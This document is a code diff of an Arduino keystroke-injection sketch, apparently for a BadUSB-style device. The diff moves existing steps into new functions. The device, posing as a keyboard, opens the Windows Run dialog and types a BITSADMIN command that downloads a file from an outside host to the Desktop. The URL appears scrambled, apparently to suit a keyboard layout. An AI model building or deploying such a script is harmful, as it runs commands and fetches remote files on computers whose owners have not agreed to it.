@@ -4,6 +4,15 @@
 void setup() {
   Keyboard.begin();
   
+  runCmd();
+  delay(1000);
+
+  download();
+  
+  Keyboard.end();
+}
+
+void runCmd(){
   Keyboard.press(KEY_LEFT_GUI);
   delay(500);
   Keyboard.press('r');
@@ -16,8 +25,9 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   delay(200);
   Keyboard.releaseAll();
-  delay(1000);
- 
+}
+
+void download(){
   Keyboard.print("BITSADMIN &transfer testJob &PRIORITY HIGH ");
   delay(500);
   Keyboard.print("HTTPS?&&I/stack/Imgur/com&huT85/jpg %cd%&Desktop&test/jpg");
@@ -25,9 +35,7 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   delay(300);
   Keyboard.releaseAll();
-  Keyboard.end();
 }
-
 void loop() {
   // put your main code here, to run repeatedly:
 
